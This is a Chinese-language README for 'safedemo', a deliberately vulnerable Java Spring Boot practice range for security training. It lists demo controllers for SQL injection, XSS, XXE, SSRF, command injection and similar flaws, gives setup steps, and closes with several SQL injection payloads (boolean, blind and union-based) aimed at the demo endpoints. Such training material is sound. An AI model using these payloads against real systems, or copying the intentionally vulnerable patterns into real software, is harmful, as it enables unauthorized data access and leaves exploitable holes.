#### safedemo java靶场

#### 项目目录结构
.
├── docker         docker的集成环境（该项目的数据库文件也在这里）
├── log            项目的日志存放位置
├── pom.xml        maven项目表示
├── src
│   ├── main
│   │   ├── java
│   │   │   └── com
│   │   │       └── safe
│   │   │           └── demo
│   │   │               ├── SafeHoleApplication.java     springboot项目启动入口
│   │   │               ├── goodscode                    安全编码demo
│   │   │               ├── hole   
│   │   │               │   ├── config                   配置文件
│   │   │               │   ├── controller               漏洞demo
│   │   │               │   │   ├── CRLF.java
│   │   │               │   │   ├── CommandHole.java
│   │   │               │   │   ├── CookieSafe.java
│   │   │               │   │   ├── FileSource.java
│   │   │               │   │   ├── FindPasswd.java
│   │   │               │   │   ├── LogicHole.java
│   │   │               │   │   ├── Passwd.java
│   │   │               │   │   ├── RedirectHole.java
│   │   │               │   │   ├── ReflectHole.java
│   │   │               │   │   ├── RequestMethodHole.java
│   │   │               │   │   ├── SSRF.java
│   │   │               │   │   ├── SqlInjustion.java
│   │   │               │   │   ├── SwaggerRedirectController.java    swagger文档，通过这个可以在页面上测试demo
│   │   │               │   │   ├── UltraViresLoopholes.java          越权demo示例
│   │   │               │   │   ├── XPathHole.java
│   │   │               │   │   ├── XSS.java
│   │   │               │   │   ├── XXE.java
│   │   │               │   │   └── hibernate
│   │   │               │   │       ├── dao
│   │   │               │   │       │   ├── HibernateDao.java
│   │   │               │   │       │   └── HibernateDaoImpl.java
│   │   │               │   ├── exception                             全局异常处理器
│   │   │               │   ├── interceptor                           全局拦截器
│   │   │               │   ├── mapper
│   │   │               │   ├── pojo
│   │   │               │   ├── socket
│   │   │               │   └── utils
│   │   └── resources
│   │       ├── Generator.xml
│   │       ├── application-local.properties
│   │       ├── application-prod.properties
│   │       ├── application.properties
│   │       ├── esapi
│   │       │   ├── ESAPI.properties
│   │       │   └── esapi-java-logging.properties
│   │       ├── logback-spring.xml
│   │       ├── mapper
│   │       ├── mapperweb
│   │       ├── static
│   │       │   ├── csrf-poc.html        
│   │       │   ├── gettest.html
│   │       │   └── upload.html          文件上传页面
│   │       ├── templates
│   │       │   └── xss.html             xss展示页面
│   │       └── xml
│   │           ├── payload.xml          xxe payload
│   │           └── users.xml



#### 项目docker下启动方式
> 进入docker目录下执行
> docker-compose build .
> docker-compose up -d 

#### idea下启动方式
> 使用mysql数据库，导入数据库初始数据(test_jdbc.sql,目录结构有存放位置说明)
> springboot项目启动入口为@SpringBootApplication（即SafeHoleApplication.java文件）

#### 项目访问地址
> http://localhost:8081


#### payload
>  /mybatis_special_sql_inject?name=user where 1=if((ascii(substr(database() from 1 for 1))),1,0)
>  /mybatis_sql_inject/name=%' or 1=1-- q
>  /mybatis_sql_protect/name=%' or 1=1-- q
>
>  /hibernate_sql_inject/name=as' or 1=1 -- 1
>  /hibernate_sql_protect/name=as' or 1=1 -- 1
> 
>  /jdbc_sql_inject/?name=a' or 1=1 -- 1
>  /jdbc_sql_protect/name=a' or 1=1 -- 1
>  /prepare_sql_inject/?name=information_schema.tables where table=database() union select user.*,1,2,3,4,5,6,7,8,9,10,11,12,131,14,15,16 from user
>  
> 





